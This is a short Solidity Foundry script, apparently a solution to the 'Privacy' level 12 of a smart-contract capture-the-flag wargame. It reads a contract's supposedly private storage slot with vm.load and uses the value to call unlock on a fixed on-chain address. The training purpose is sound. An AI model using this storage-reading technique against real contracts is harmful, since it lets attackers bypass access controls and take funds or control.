// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/levels/12-Privacy/Privacy.sol";


contract ExploitScript is Script {
    Privacy level12 = Privacy(payable(0x34e0Ec7d959166c773c24883CEA09aD1874540f3));

    function run() public {
        vm.startBroadcast();

        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));

        vm.stopBroadcast();
    }
}
